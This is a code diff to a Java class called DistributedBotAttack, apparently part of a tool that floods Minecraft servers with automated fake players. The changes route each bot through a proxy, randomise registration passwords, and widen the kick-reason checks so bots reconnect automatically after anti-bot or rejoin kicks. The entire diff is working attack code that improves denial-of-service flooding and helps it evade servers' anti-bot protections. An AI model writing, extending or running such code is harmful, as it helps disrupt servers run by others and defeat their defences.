@@ -265,8 +265,11 @@ public class DistributedBotAttack extends IAttack {
 
 	public Client createClient(final String ip, int port, final String username, Proxy proxy) {
 		GameProfile profile = new GameProfile(UUID.randomUUID(), username);
-		Client client = new Client(ip, port, new MinecraftProtocol(profile, Utils.getRandomString(128, 128)),
-				new TcpSessionFactory());
+		Client client = new Client(ip, port, new MinecraftProtocol(profile,
+				Utils.getRandomString(128, 128)),
+				new TcpSessionFactory(proxy));
+		// Client client = new Client(ip, port, new MinecraftProtocol(username), new
+		// TcpSessionFactory(proxy));
 		new MCForge(client.getSession(), this.modList).init();
 		client.getSession().addListener(new SessionListener() {
 			public void packetReceived(PacketReceivedEvent e) {
@@ -289,7 +292,7 @@ public class DistributedBotAttack extends IAttack {
 
 					}
 					if (message.contains("/login")) {
-						client.getSession().send(new ClientChatPacket("/l 123123"));
+						client.getSession().send(new ClientChatPacket("/l 1234abcd"));
 					}
 
 					if (message.contains("tpserver") && !message.contains(name)) {
@@ -351,7 +354,8 @@ public class DistributedBotAttack extends IAttack {
 				String reason = e.getReason();
 				boolean blacklisted = reason.contains("已被") && reason.contains("黑名单");
 				boolean stats = reason.contains("重") || reason.contains("join") || reason.contains("antibot")
-						|| reason.contains("加入") || reason.contains("反") || reason.contains("等");
+						|| reason.contains("加入") || reason.contains("反")
+						|| reason.contains("等") || reason.contains("Reconnect") || reason.contains("enter");
 				if (stats && !blacklisted) {
 					Utils.log("[" + username + "]正在重连......");
 					try {
@@ -427,7 +431,7 @@ public class DistributedBotAttack extends IAttack {
 
 	public void reg(Session session) {
 		try {
-			String passwd = "123123";
+			String passwd = Utils.getRandomString(8, 8);
 			session.send(
 					new ClientChatPacket("/reg " + passwd + " " + passwd));
 			// String email;
